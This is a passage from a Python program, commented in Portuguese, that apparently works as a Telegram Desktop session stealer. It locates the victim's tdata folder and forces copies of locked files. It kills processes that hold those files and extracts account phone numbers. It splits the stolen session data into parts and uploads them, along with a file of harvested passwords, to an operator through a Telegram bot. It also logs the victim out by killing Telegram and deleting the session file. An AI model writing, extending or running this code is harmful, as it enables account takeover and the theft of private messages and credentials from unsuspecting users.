                    print("***OK Telegram Desktop has been found")
                    return found
                else:
                    print("ERROR: ^ this is not an actual TG folder. Continuing...")
                    pass

def getFileProperties(fname):
    props = {'FileVersion': None}
    try:
        # backslash as parm returns dictionary of numeric info corresponding to VS_FIXEDFILEINFO struc
        fixedInfo = win32api.GetFileVersionInfo(fname, '\\')
        props['FileVersion'] = "%d.%d.%d.%d" % (fixedInfo['FileVersionMS'] / 65536,
                fixedInfo['FileVersionMS'] % 65536, fixedInfo['FileVersionLS'] / 65536,
                fixedInfo['FileVersionLS'] % 65536)
    except Exception as e:
        print(repr(e))
        pass
    return props


def logout_windows(bool):
    if bool:
        try:
            global pathd877
            os.system('taskkill /f /im Telegram.exe')
            os.remove(pathd877)
        except Exception as e:
            print("ERROR: Failed to logout: " + repr(e))
            pass
    else:
        print("***Logout state is 0")
        pass


def send_txt():
    try:
        bot.send_document(user_id, open(name_ur_txt,'rb'))
        os.remove(name_ur_txt)
        print("***OK Passwords have been sended successfully")
    except Exception as e:
        print("ERROR in send_txt() func: " + repr(e))
        pass




def verifica_telegram_exe(tdata_path):
    """
    Verifica se existe Telegram.exe próximo à pasta tdata.
    Retorna o diretório onde está o Telegram.exe ou None.
    """
    # Se tdata_path é a pasta tdata, pega o diretório pai
    if os.path.basename(tdata_path) == 'tdata':
        telegram_dir = os.path.dirname(tdata_path)
    else:
        telegram_dir = tdata_path
    
    # Verifica se Telegram.exe está neste diretório
    telegram_exe = os.path.join(telegram_dir, "Telegram.exe")
    if os.path.exists(telegram_exe):
        return telegram_dir
    
    # Se não encontrou, tenta no diretório pai
    parent_dir = os.path.dirname(telegram_dir)
    telegram_exe = os.path.join(parent_dir, "Telegram.exe")
    if os.path.exists(telegram_exe):
        return parent_dir
    
    return None

def copiar_arquivo_chunks(src, dst):
    """Copia arquivo em chunks."""
    with open(src, 'rb') as f_src:
        with open(dst, 'wb') as f_dst:
            while True:
                chunk = f_src.read(8192)
                if not chunk:
                    break
                f_dst.write(chunk)

def copiar_arquivo_memoria(src, dst):
    """Copia arquivo carregando tudo em memória."""
    with open(src, 'rb') as f:
        data = f.read()
    with open(dst, 'wb') as f:
        f.write(data)

def copiar_arquivo_compartilhado(src, dst):
    """Tenta copiar arquivo usando modo compartilhado (Windows)."""
    try:
        import win32file
        handle = win32file.CreateFile(
            src,
            win32file.GENERIC_READ,
            win32file.FILE_SHARE_READ | win32file.FILE_SHARE_WRITE | win32file.FILE_SHARE_DELETE,
            None,
            win32file.OPEN_EXISTING,
            0,
            None
        )
        try:
            with open(dst, 'wb') as f_dst:
                while True:
                    data = win32file.ReadFile(handle, 8192)
                    if not data[1]:
                        break
                    f_dst.write(data[1])
        finally:
            win32file.CloseHandle(handle)
    except ImportError:
        # Se não tiver win32file, usa método padrão
        copiar_arquivo_chunks(src, dst)
    except:
        # Se falhar, tenta método padrão
        raise

def copiar_arquivo_ctypes(src, dst):
    """Tenta copiar usando ctypes para acesso direto ao sistema."""
    try:
        import ctypes
        from ctypes import wintypes
        
        # Constantes do Windows
        GENERIC_READ = 0x80000000
        FILE_SHARE_READ = 0x00000001
        FILE_SHARE_WRITE = 0x00000002
        FILE_SHARE_DELETE = 0x00000004
        OPEN_EXISTING = 3
        FILE_ATTRIBUTE_NORMAL = 0x80
        
        kernel32 = ctypes.windll.kernel32
        CreateFileW = kernel32.CreateFileW
        CreateFileW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD,
                                ctypes.POINTER(wintypes.LPVOID), wintypes.DWORD,
                                wintypes.DWORD, wintypes.HANDLE]
        CreateFileW.restype = wintypes.HANDLE
        
        ReadFile = kernel32.ReadFile
        ReadFile.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.DWORD,
                             ctypes.POINTER(wintypes.DWORD), ctypes.POINTER(wintypes.LPVOID)]
        ReadFile.restype = wintypes.BOOL
        
        CloseHandle = kernel32.CloseHandle
        CloseHandle.argtypes = [wintypes.HANDLE]
        CloseHandle.restype = wintypes.BOOL
        
        # Abre arquivo com acesso compartilhado máximo
        handle = CreateFileW(
            src,
            GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            None
        )
        
        if handle == -1:  # INVALID_HANDLE_VALUE
            raise IOError("Could not open file")
        
        try:
            with open(dst, 'wb') as f_dst:
                buffer = ctypes.create_string_buffer(8192)
                bytes_read = wintypes.DWORD()
                
                while True:
                    if not ReadFile(handle, buffer, 8192, ctypes.byref(bytes_read), None):
                        break
                    if bytes_read.value == 0:
                        break
                    f_dst.write(buffer.raw[:bytes_read.value])
        finally:
            CloseHandle(handle)
    except Exception:
        raise

def copiar_arquivo_compartilhado_leitura(arquivo_path, max_bytes):
    """Lê arquivo usando modo compartilhado (Windows)."""
    try:
        import win32file
        handle = win32file.CreateFile(
            arquivo_path,
            win32file.GENERIC_READ,
            win32file.FILE_SHARE_READ | win32file.FILE_SHARE_WRITE | win32file.FILE_SHARE_DELETE,
            None,
            win32file.OPEN_EXISTING,
            0,
            None
        )
        try:
            data = win32file.ReadFile(handle, max_bytes)
            return data[1] if data[1] else b''
        finally:
            win32file.CloseHandle(handle)
    except:
        raise

def copiar_arquivo_ctypes_leitura(arquivo_path, max_bytes):
    """Lê arquivo usando ctypes para acesso direto."""
    try:
        import ctypes
        from ctypes import wintypes
        
        GENERIC_READ = 0x80000000
        FILE_SHARE_READ = 0x00000001
        FILE_SHARE_WRITE = 0x00000002
        FILE_SHARE_DELETE = 0x00000004
        OPEN_EXISTING = 3
        FILE_ATTRIBUTE_NORMAL = 0x80
        
        kernel32 = ctypes.windll.kernel32
        CreateFileW = kernel32.CreateFileW
        CreateFileW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD,
                                ctypes.POINTER(wintypes.LPVOID), wintypes.DWORD,
                                wintypes.DWORD, wintypes.HANDLE]
        CreateFileW.restype = wintypes.HANDLE
        
        ReadFile = kernel32.ReadFile
        ReadFile.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.DWORD,
                             ctypes.POINTER(wintypes.DWORD), ctypes.POINTER(wintypes.LPVOID)]
        ReadFile.restype = wintypes.BOOL
        
        CloseHandle = kernel32.CloseHandle
        CloseHandle.argtypes = [wintypes.HANDLE]
        CloseHandle.restype = wintypes.BOOL
        
        handle = CreateFileW(
            arquivo_path,
            GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            None
        )
        
        if handle == -1:
            raise IOError("Could not open file")
        
        try:
            buffer = ctypes.create_string_buffer(max_bytes)
            bytes_read = wintypes.DWORD()
            
            if ReadFile(handle, buffer, max_bytes, ctypes.byref(bytes_read), None):
                return buffer.raw[:bytes_read.value]
            return b''
        finally:
            CloseHandle(handle)
    except:
        raise

def copiar_arquivo_forcado_leitura(arquivo_path, max_bytes):
    """Lê arquivo usando métodos forçados."""
    try:
        import win32file
        import win32con
        
        handle = win32file.CreateFile(
            arquivo_path,
            win32file.GENERIC_READ,
            win32file.FILE_SHARE_READ | win32file.FILE_SHARE_WRITE | win32file.FILE_SHARE_DELETE,
            None,
            win32file.OPEN_EXISTING,
            win32file.FILE_FLAG_NO_BUFFERING | win32file.FILE_FLAG_RANDOM_ACCESS,
            None
        )
        try:
            data = win32file.ReadFile(handle, max_bytes)
            return data[1] if data[1] else b''
        finally:
            win32file.CloseHandle(handle)
    except:
        # Fallback: tenta ler em chunks pequenos
        try:
            data = b''
            with open(arquivo_path, 'rb') as f:
                while len(data) < max_bytes:
                    chunk = f.read(1024)
                    if not chunk:
                        break
                    data += chunk
                    if len(data) >= max_bytes:
                        data = data[:max_bytes]
                        break
            return data
        except:
            raise

def ler_arquivo_parcial(arquivo_path, max_bytes):
    """Tenta ler arquivo parcialmente, pulando bytes problemáticos."""
    data = b''
    pos = 0
    chunk_size = 512
    
    try:
        f = open(arquivo_path, 'rb')
        try:
            while len(data) < max_bytes and pos < max_bytes * 2:
                try:
                    f.seek(pos)
                    chunk = f.read(chunk_size)
                    if not chunk:
                        break
                    data += chunk
                    pos += len(chunk)
                    if len(data) >= max_bytes:
                        data = data[:max_bytes]
                        break
                except:
                    # Pula bytes problemáticos
                    pos += chunk_size
                    continue
        finally:
            f.close()
        return data
    except:
        return b''

def copiar_arquivo_forcado(src, dst):
    """Tenta forçar a cópia usando múltiplas técnicas avançadas."""
    import time
    
    # Tenta primeiro com win32file com flags especiais
    try:
        import win32file
        import win32con
        
        # Tenta abrir com flags que permitem acesso mesmo quando bloqueado
        handle = win32file.CreateFile(
            src,
            win32file.GENERIC_READ,
            win32file.FILE_SHARE_READ | win32file.FILE_SHARE_WRITE | win32file.FILE_SHARE_DELETE,
            None,
            win32file.OPEN_EXISTING,
            win32file.FILE_FLAG_NO_BUFFERING | win32file.FILE_FLAG_RANDOM_ACCESS,
            None
        )
        try:
            with open(dst, 'wb') as f_dst:
                while True:
                    try:
                        data = win32file.ReadFile(handle, 65536)  # Lê 64KB de uma vez
                        if not data[1]:
                            break
                        f_dst.write(data[1])
                    except:
                        # Se falhar, tenta ler menos
                        try:
                            data = win32file.ReadFile(handle, 4096)
                            if not data[1]:
                                break
                            f_dst.write(data[1])
                        except:
                            break
        finally:
            win32file.CloseHandle(handle)
        return
    except:
        pass
    
    # Tenta com ctypes
    try:
        copiar_arquivo_ctypes(src, dst)
        return
    except:
        pass
    
    # Última tentativa: tenta ler em modo binário com retry
    for tentativa in range(5):
        try:
            time.sleep(0.1 * tentativa)  # Espera progressivamente mais
            # Tenta abrir em modo não-bloqueante
            try:
                f_src = open(src, 'rb')
                f_src.seek(0, 2)  # Vai pro final
                size = f_src.tell()
                f_src.seek(0)
                
                with open(dst, 'wb') as f_dst:
                    pos = 0
                    chunk_size = 4096
                    while pos < size:
                        try:
                            f_src.seek(pos)
                            chunk = f_src.read(chunk_size)
                            if not chunk:
                                break
                            f_dst.write(chunk)
                            pos += len(chunk)
                        except:
                            # Pula bytes problemáticos
                            pos += chunk_size
                            continue
                f_src.close()
                return
            except:
                pass
        except:
            pass
    
    raise IOError("Could not copy file after all attempts")

def tentar_liberar_arquivo(arquivo):
    """Tenta liberar um arquivo bloqueado usando técnicas do Windows."""
    import time
    try:
        import psutil
        
        # Tenta encontrar processos que estão usando o arquivo
        processos_liberados = []
        for proc in psutil.process_iter(['pid', 'name', 'open_files']):
            try:
                if proc.info['open_files']:
                    for file_info in proc.info['open_files']:
                        if arquivo.lower() in file_info.path.lower():
                            # Não mata Telegram.exe (pode ser necessário)
                            if 'telegram' not in proc.info['name'].lower():
                                try:
                                    proc.kill()
                                    processos_liberados.append(proc.info['pid'])
                                except:
                                    pass
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        
        if processos_liberados:
            time.sleep(0.5)  # Espera processos terminarem
            return True
    except ImportError:
        # psutil não disponível, tenta com handle do Windows
        try:
            import win32file
            import win32con
            # Tenta abrir e fechar para forçar liberação
            handle = win32file.CreateFile(
                arquivo,
                win32file.GENERIC_READ,
                win32file.FILE_SHARE_READ | win32file.FILE_SHARE_WRITE | win32file.FILE_SHARE_DELETE,
                None,
                win32file.OPEN_EXISTING,
                win32con.FILE_FLAG_DELETE_ON_CLOSE,
                None
            )
            win32file.CloseHandle(handle)
            time.sleep(0.2)
            return True
        except:
            pass
    except:
        pass
    return False

def copia_tdata_ignorando_bloqueados(src, dst):
    """
    Copia pasta tdata arquivo por arquivo, ignorando arquivos bloqueados.
    Retorna contadores de sucesso e falhas.
    """
    import time
    sucesso = 0
    falhas = 0
    bloqueados = []
    
    # Cria estrutura de diretórios
    for root, dirs, files in os.walk(src):
        # Calcula caminho relativo
        rel_path = os.path.relpath(root, src)
        if rel_path == '.':
            dst_dir = dst
        else:
            dst_dir = os.path.join(dst, rel_path)
        
        # Cria diretório de destino
        try:
            os.makedirs(dst_dir, exist_ok=True)
        except:
            pass
        
        # Copia arquivos
        for file in files:
            src_file = os.path.join(root, file)
            dst_file = os.path.join(dst_dir, file)
            
            # Tenta copiar com múltiplas tentativas e métodos alternativos
            copiado = False
            metodos = [
                # Método 1: shutil.copy2 (padrão)
                lambda: shutil.copy2(src_file, dst_file),
                # Método 2: Leitura binária em chunks
                lambda: copiar_arquivo_chunks(src_file, dst_file),
                # Método 3: Leitura completa em memória
                lambda: copiar_arquivo_memoria(src_file, dst_file),
                # Método 4: Tenta com modo compartilhado
                lambda: copiar_arquivo_compartilhado(src_file, dst_file),
                # Método 5: Tenta com ctypes (acesso direto)
                lambda: copiar_arquivo_ctypes(src_file, dst_file),
                # Método 6: Método forçado (último recurso)
                lambda: copiar_arquivo_forcado(src_file, dst_file),
            ]
            
            for tentativa, metodo in enumerate(metodos):
                try:
                    metodo()
                    sucesso += 1
                    copiado = True
                    break
                except (PermissionError, IOError, OSError) as e:
                    if tentativa < len(metodos) - 1:
                        time.sleep(0.2)  # Espera antes de tentar próximo método
                    else:
                        # Se todos os métodos falharam, adiciona à lista de bloqueados
                        falhas += 1
                        bloqueados.append(src_file)
                except Exception as e:
                    if tentativa == len(metodos) - 1:
                        falhas += 1
                        bloqueados.append(src_file)
                    else:
                        time.sleep(0.2)
    
    # Segunda passagem: tenta copiar arquivos bloqueados com métodos mais agressivos
    if bloqueados:
        print(f"***Tentando copiar {len(bloqueados)} arquivos bloqueados novamente...")
        bloqueados_restantes = []
        
        for src_file in bloqueados:
            # Calcula caminho de destino
            rel_path = os.path.relpath(src_file, src)
            dst_file = os.path.join(dst, rel_path)
            
            # Garante que diretório existe
            os.makedirs(os.path.dirname(dst_file), exist_ok=True)
            
            # Tenta liberar o arquivo primeiro
            tentar_liberar_arquivo(src_file)
            time.sleep(0.3)
            
            # Tenta métodos mais agressivos
            copiado = False
            metodos_agressivos = [
                lambda: copiar_arquivo_forcado(src_file, dst_file),
                lambda: copiar_arquivo_ctypes(src_file, dst_file),
                lambda: copiar_arquivo_compartilhado(src_file, dst_file),
            ]
            
            for metodo in metodos_agressivos:
                try:
                    metodo()
                    sucesso += 1
                    falhas -= 1
                    copiado = True
                    print(f"***OK Conseguiu copiar arquivo bloqueado: {os.path.basename(src_file)}")
                    break
                except:
                    time.sleep(0.3)
            
            if not copiado:
                bloqueados_restantes.append(src_file)
                # Última tentativa: tenta copiar parcialmente (pula bytes problemáticos)
                try:
                    with open(src_file, 'rb') as f_src:
                        with open(dst_file, 'wb') as f_dst:
                            pos = 0
                            chunk_size = 1024
                            max_size = 10 * 1024 * 1024  # Limita a 10MB para arquivos muito problemáticos
                            
                            while pos < max_size:
                                try:
                                    f_src.seek(pos)
                                    chunk = f_src.read(chunk_size)
                                    if not chunk:
                                        break
                                    f_dst.write(chunk)
                                    pos += len(chunk)
                                except:
                                    # Pula bytes problemáticos
                                    pos += chunk_size
                                    continue
                    
                    if os.path.getsize(dst_file) > 0:
                        sucesso += 1
                        falhas -= 1
                        if src_file in bloqueados_restantes:
                            bloqueados_restantes.remove(src_file)
                        print(f"***OK Copiou parcialmente: {os.path.basename(src_file)}")
                except:
                    pass
        
        bloqueados = bloqueados_restantes
    
    return sucesso, falhas, bloqueados

def dividir_arquivo_em_partes(arquivo_path, max_size_bytes, conjunto_num):
    """
    Divide um arquivo em partes binárias que podem ser reconstruídas.
    Cada parte é um arquivo binário simples que pode ser concatenado para reconstruir o original.
    Usa leitura/escrita em chunks para garantir integridade.
    """
    try:
        import hashlib
        
        partes = []
        parte_num = 1
        tamanho_original = os.path.getsize(arquivo_path)
        total_lido = 0
        
        # Calcula hash do arquivo original para validação
        print(f"***Calculando checksum do arquivo original...")
        hash_original = hashlib.md5()
        with open(arquivo_path, 'rb') as f:
            while True:
                chunk = f.read(8192)
                if not chunk:
                    break
                hash_original.update(chunk)
        checksum_original = hash_original.hexdigest()
        print(f"***Checksum original: {checksum_original}")
        
        # Divide o arquivo em partes
        with open(arquivo_path, 'rb') as arquivo_original:
            while total_lido < tamanho_original:
                parte_path = os.path.join(temp, f'conjunto_{conjunto_num}_parte_{parte_num:03d}.bin')
                registrar_arquivo_temp(parte_path)
                
                # Lê em chunks para não usar muita memória
                bytes_restantes = min(max_size_bytes, tamanho_original - total_lido)
                bytes_lidos = 0
                
                with open(parte_path, 'wb') as parte_file:
                    while bytes_lidos < bytes_restantes:
                        chunk_size = min(8192, bytes_restantes - bytes_lidos)
                        chunk = arquivo_original.read(chunk_size)
                        
                        if not chunk:
                            break
                        
                        parte_file.write(chunk)
                        bytes_lidos += len(chunk)
                        total_lido += len(chunk)
                
                # Valida tamanho da parte
                tamanho_parte = os.path.getsize(parte_path)
                if tamanho_parte != bytes_lidos:
                    print(f"***ERRO: Tamanho da parte {parte_num} não confere!")
                    return []
                
                partes.append(parte_path)
                print(f"***Parte {parte_num} criada: {tamanho_parte / (1024*1024):.2f}MB")
                parte_num += 1
                
                # Se leu tudo, para
                if total_lido >= tamanho_original:
                    break
        
        # Valida que todas as partes somam o tamanho original
        tamanho_total_partes = sum(os.path.getsize(p) for p in partes)
        if tamanho_total_partes != tamanho_original:
            print(f"***ERRO: Tamanho total das partes ({tamanho_total_partes}) != tamanho original ({tamanho_original})")
            return []
        
        print(f"***Validação: {len(partes)} partes criadas, total: {tamanho_total_partes / (1024*1024):.2f}MB")
        return partes
    except Exception as e:
        print(f"ERROR dividindo arquivo: {repr(e)}")
        import traceback
        traceback.print_exc()
        return []

def enviar_partes(partes, conjunto_num, version, path_info, tdata_dest, json_copiados, session_copiados, tamanho_total_mb, tentar_lock=True):
    """Envia todas as partes do arquivo dividido."""
    total_partes = len(partes)
    enviadas = 0
    
    print(f"***Enviando {total_partes} partes do conjunto {conjunto_num}...")
    
    for idx, parte_path in enumerate(partes, 1):
        parte_num = idx
        parte_size_mb = os.path.getsize(parte_path) / (1024 * 1024)
        
        print(f"***Enviando parte {parte_num}/{total_partes} ({parte_size_mb:.2f}MB)...")
        
        enviado = False
        tentativa = 0
        max_tentativas = 20
        timeout_maximo = 86400 * 7  # 7 dias
        
        while not enviado and tentativa < max_tentativas:
            tentativa += 1
            try:
                if tentativa > 1:
                    wait_time = min(30 * (2 ** (tentativa - 2)), 600)
                    print(f"***Retry {tentativa} para parte {parte_num}/{total_partes} (aguardando {wait_time}s)...")
                    time.sleep(wait_time)
                
                # Obtém lock global antes de enviar
                if not obter_lock_global():
                    time.sleep(2)
                    continue
                
                try:
                    # Valida arquivo antes de enviar
                    if not os.path.exists(parte_path):
                        raise FileNotFoundError(f"Parte {parte_num} não encontrada")
                    
                    tamanho_real = os.path.getsize(parte_path)
                    if tamanho_real != parte_size_mb * 1024 * 1024:
                        parte_size_mb = tamanho_real / (1024 * 1024)
                    
                    # Abre arquivo em modo binário e envia
                    # IMPORTANTE: Não usa 'with' aqui para garantir que o arquivo não seja fechado antes do envio
                    parte_file = open(parte_path, 'rb')
                    try:
                        bot.send_document(
                            user_id,
                            parte_file,
                            caption=f"Conjunto {conjunto_num} - Parte {parte_num}/{total_partes}\nVersion: {version}\nPath: {path_info}\nTamanho total: {tamanho_total_mb:.2f}MB\nEsta parte: {parte_size_mb:.2f}MB\n\n⚠️ RECONSTRUÇÃO: Junte todas as partes em ordem (parte_001.bin + parte_002.bin + ...) para reconstruir o arquivo original.",
                            timeout=timeout_maximo,
                            disable_notification=True
                        )
                    finally:
                        parte_file.close()
                    
                    enviado = True
                    enviadas += 1
                    print(f"***OK Parte {parte_num}/{total_partes} enviada com sucesso")
                    
                    # Delay saudável entre partes (3 segundos)
                    if idx < total_partes:  # Não espera após a última parte
                        time.sleep(3)
                finally:
                    if tentar_lock:
                        liberar_lock_global()
                    
            except Exception as e:
                error_str = str(e)
                if '413' in error_str or 'file too large' in error_str.lower():
                    print(f"***ERRO: Parte ainda muito grande ({parte_size_mb:.2f}MB)")
                    return False
                elif tentativa < max_tentativas:
                    wait_time = min(60 * (2 ** (tentativa - 1)), 600)
                    print(f"***Erro na parte {parte_num}/{total_partes} (tentativa {tentativa}): {error_str[:100]}, aguardando {wait_time}s...")
                    time.sleep(wait_time)
                else:
                    print(f"***ERROR: Não foi possível enviar parte {parte_num}/{total_partes} após {max_tentativas} tentativas")
                    return False
        
        if not enviado:
            return False
    
    if enviadas == total_partes:
        print(f"***OK Todas as {total_partes} partes do conjunto {conjunto_num} foram enviadas com sucesso!")
        return True
    else:
        print(f"***ERROR: Apenas {enviadas}/{total_partes} partes foram enviadas")
        return False

def dividir_zip_em_partes(zip_path, max_size_bytes, conjunto_num):
    """
    Divide um zip grande em múltiplas partes menores.
    Mantém os arquivos do conjunto juntos (json/session sempre na primeira parte).
    Remove duplicatas.
    """
    partes = []
    parte_num = 1
    
    try:
        # Abre o zip original
        with ZipFile(zip_path, 'r') as zip_original:
            # Lista todos os arquivos no zip (sem duplicatas)
            arquivos_zip = list(dict.fromkeys(zip_original.namelist()))  # Remove duplicatas mantendo ordem
            
            # Agrupa apenas arquivos tdata (ignora json e session)
            arquivos_tdata = [f for f in arquivos_zip if f.startswith('tdata/')]
            
            # Inicia primeira parte vazia
            parte_path = os.path.join(temp, f'tdata_conjunto_{conjunto_num}_parte_{parte_num}.zip')
            partes.append(parte_path)
            parte_size = 0
            arquivos_adicionados = set()
            
            # Adiciona arquivos tdata, dividindo em partes se necessário
            zip_parte = None
            for arquivo in arquivos_tdata:
                try:
                    if arquivo in arquivos_adicionados:
                        continue  # Pula se já foi adicionado
                    
                    arquivo_data = zip_original.read(arquivo)
                    arquivo_size = len(arquivo_data)
                    
                    # Se adicionar este arquivo exceder o limite, cria nova parte
                    if parte_size + arquivo_size > max_size_bytes and parte_size > 0:
                        if zip_parte:
                            zip_parte.close()
                        parte_num += 1
                        parte_path = os.path.join(temp, f'tdata_conjunto_{conjunto_num}_parte_{parte_num}.zip')
                        partes.append(parte_path)
                        zip_parte = ZipFile(parte_path, 'w', compression=ZIP_STORED)  # Sem compressão = mais rápido
                        parte_size = 0
                    
                    # Abre parte atual se necessário
                    if zip_parte is None:
                        zip_parte = ZipFile(parte_path, 'a' if parte_size > 0 else 'w', compression=ZIP_STORED)  # Sem compressão = mais rápido
                    
                    # Adiciona arquivo à parte atual
                    zip_parte.writestr(arquivo, arquivo_data)
                    arquivos_adicionados.add(arquivo)
                    parte_size += arquivo_size
                    
                except Exception as e:
                    print(f"ERROR adding {arquivo} to part: {repr(e)}")
                    continue
            
            # Fecha última parte se estiver aberta
            if zip_parte:
                zip_parte.close()
            
            print(f"***Zip dividido em {len(partes)} partes")
            return partes
            
    except Exception as e:
        print(f"ERROR dividing zip: {repr(e)}")
        # Se falhar ao dividir, retorna o arquivo original
        return [zip_path]

def extrair_numero_conta_telegram(tdata_path):
    """
    Tenta extrair o número da conta do Telegram a partir dos arquivos do tdata.
    Retorna os últimos dígitos do número da conta ou None se não encontrar.
    """
    if not tdata_path or not os.path.exists(tdata_path):
        return None
    
    numero_conta = None
    
    try:
        # Busca em arquivos que podem conter o número da conta
        arquivos_importantes = []
        for root, dirs, files in os.walk(tdata_path):
            for file in files:
                file_lower = file.lower()
                # Arquivos que podem conter informações da conta
                if any(pattern in file_lower for pattern in ['key', 'auth', 'session', 'd877', 'map', 'settings']):
                    arquivos_importantes.append(os.path.join(root, file))
        
        # Tenta ler e extrair número da conta dos arquivos
        for arquivo in arquivos_importantes[:20]:  # Limita a 20 arquivos
            try:
                # Tenta ler como texto (JSON, etc)
                metodos_leitura = [
                    lambda: open(arquivo, 'r', encoding='utf-8', errors='ignore').read(4096),
                    lambda: open(arquivo, 'r', encoding='latin-1', errors='ignore').read(4096),
                    lambda: copiar_arquivo_compartilhado_leitura(arquivo, 4096).decode('utf-8', errors='ignore'),
                ]
                
                conteudo = None
                for metodo in metodos_leitura:
                    try:
                        conteudo = metodo()
                        break
                    except:
                        continue
                
                if conteudo:
                    # Procura por padrões de número de conta (8+ dígitos, sem limite superior)
                    import re
                    # Procura números longos que podem ser números de conta
                    padroes = [
                        r'\b\d{8,}\b',  # Números de 8+ dígitos (sem limite superior)
                        r'"phone":\s*"?(\d{8,})"?',  # JSON com phone
                        r'phone["\']?\s*[:=]\s*["\']?(\d{8,})',  # Variações
                        r'user_id["\']?\s*[:=]\s*["\']?(\d{8,})',  # user_id
                        r'id["\']?\s*[:=]\s*["\']?(\d{8,})',  # id genérico
                    ]
                    
                    for padrao in padroes:
                        matches = re.findall(padrao, conteudo)
                        if matches:
                            # Pega o primeiro número encontrado que parece ser um número de conta
                            for match in matches:
                                num_str = match if isinstance(match, str) else str(match)
                                if len(num_str) >= 8:  # Números de conta geralmente têm 8+ dígitos
                                    try:
                                        num = int(num_str)
                                        if num > 10000000:  # Números de conta válidos são grandes
                                            numero_conta = num
                                            print(f"***Número da conta encontrado: {numero_conta}")
                                            break
                                    except:
                                        continue
                            if numero_conta:
                                break
                
                if numero_conta:
                    break
                    
            except Exception as e:
                continue
        
        # Se não encontrou, tenta ler arquivos binários procurando por padrões
        if not numero_conta:
            for arquivo in arquivos_importantes[:10]:
                try:
                    # Lê como binário
                    metodos_leitura_bin = [
                        lambda: open(arquivo, 'rb').read(8192),
                        lambda: copiar_arquivo_compartilhado_leitura(arquivo, 8192),
                    ]
                    
                    dados_bin = None
                    for metodo in metodos_leitura_bin:
                        try:
                            dados_bin = metodo()
                            break
                        except:
                            continue
                    
                    if dados_bin:
                        # Procura por sequências de dígitos no binário
                        import re
                        # Converte para string e procura números (sem limite superior)
                        dados_str = dados_bin.decode('utf-8', errors='ignore') + dados_bin.decode('latin-1', errors='ignore')
                        matches = re.findall(r'\d{8,}', dados_str)  # 8+ dígitos, sem limite superior
                        if matches:
                            for match in matches:
                                try:
                                    num = int(match)
                                    if num > 10000000:
                                        numero_conta = num
                                        print(f"***Número da conta encontrado (binário): {numero_conta}")
                                        break
                                except:
                                    continue
                    
                    if numero_conta:
                        break
                        
                except:
                    continue
                    
    except Exception as e:
        pass
    
    # Retorna o número completo da conta
    if numero_conta:
        return str(numero_conta)
    
    return None

def criar_cliente_telethon_seguro(session_name, api_id, api_hash, session_file=None):
    """
    Cria cliente Telethon de forma segura, interceptando erros de tabela existente.
    Retorna (client, sucesso) onde sucesso indica se o cliente foi criado.
    SEMPRE retorna um cliente válido ou None, nunca lança exceção de tabela existente.
    Os erros de tabela existente são NORMAIS e são ignorados silenciosamente.
    """
    if not TELETHON_AVAILABLE:
        return None, False
    
    # Se tem session_file, garante que as tabelas já existem antes de passar para Telethon
    if session_file and os.path.exists(session_file):
        try:
            # Verifica e garante que todas as tabelas obrigatórias existem
            conn_prep = sqlite3.connect(session_file, timeout=2.0)
            cursor_prep = conn_prep.cursor()
            
            # Verifica quais tabelas existem
            cursor_prep.execute("SELECT name FROM sqlite_master WHERE type='table'")
            tabelas_existentes = [row[0] for row in cursor_prep.fetchall()]
            
            tabelas_obrigatorias = ['version', 'sessions', 'entities', 'sent_files', 'update_state']
            tabelas_faltando = [t for t in tabelas_obrigatorias if t not in tabelas_existentes]
            
            # Cria tabelas faltando com IF NOT EXISTS (evita erro)
            for tabela in tabelas_faltando:
                try:
                    if tabela == 'version':
                        cursor_prep.execute('CREATE TABLE IF NOT EXISTS version (version INTEGER PRIMARY KEY)')
                        cursor_prep.execute('INSERT OR IGNORE INTO version (version) VALUES (1)')
                    elif tabela == 'sessions':
                        cursor_prep.execute('''
                            CREATE TABLE IF NOT EXISTS sessions (
                                dc_id INTEGER PRIMARY KEY,
                                server_address TEXT,
                                port INTEGER,
                                auth_key BLOB,
                                takeout_id INTEGER
                            )
                        ''')
                    elif tabela == 'entities':
                        cursor_prep.execute('''
                            CREATE TABLE IF NOT EXISTS entities (
                                id INTEGER PRIMARY KEY,
                                hash INTEGER NOT NULL,
                                username TEXT,
                                phone INTEGER,
                                name TEXT,
                                date INTEGER
                            )
                        ''')
                    elif tabela == 'sent_files':
                        cursor_prep.execute('''
                            CREATE TABLE IF NOT EXISTS sent_files (
                                md5_digest BLOB,
                                file_size INTEGER,
                                type INTEGER,
                                id INTEGER,
                                hash INTEGER,
                                PRIMARY KEY (md5_digest, file_size, type)
                            )
                        ''')
                    elif tabela == 'update_state':
                        cursor_prep.execute('''
                            CREATE TABLE IF NOT EXISTS update_state (
                                id INTEGER PRIMARY KEY,
                                pts INTEGER,
                                qts INTEGER,
                                date INTEGER,
                                seq INTEGER
                            )
                        ''')
                except:
                    pass  # Ignora erros ao criar tabelas (já existem)
            
            conn_prep.commit()
            conn_prep.close()
        except:
            pass  # Se não conseguir preparar, tenta mesmo assim
    
    # Tenta criar cliente - agora as tabelas já existem, então não deve dar erro
    max_tentativas = 2  # Reduzido - não precisa de muitas tentativas
    client = None
    
    for tentativa in range(max_tentativas):
        try:
            # Tenta criar cliente
            if session_file:
                # Usa arquivo SQLite diretamente
                try:
                    client = TelegramClient(session_name, api_id, api_hash)
                    # Se chegou aqui sem erro, cliente foi criado
                    return client, True
                except Exception as e_init:
                    error_str_init = str(e_init).lower()
                    error_repr_init = repr(e_init)
                    
                    # Verifica se é erro de tabela existente (NORMAL - ignora silenciosamente)
                    if ('already exists' in error_str_init or 
                        ('table' in error_str_init and 'exists' in error_str_init) or
                        'operationalerror' in error_str_init or
                        'update_state' in error_str_init):
                        
                        # Erro de tabela existente é NORMAL - Telethon detectou que tabelas já existem
                        # Não mostra mensagem de erro - é comportamento esperado
                        if tentativa < max_tentativas - 1:
                            # Aguarda um pouco e tenta novamente
                            time.sleep(0.2)
                            continue
                        else:
                            # Última tentativa - tenta criar mesmo assim (pode funcionar)
                            try:
                                client = TelegramClient(session_name, api_id, api_hash)
                                return client, True
                            except:
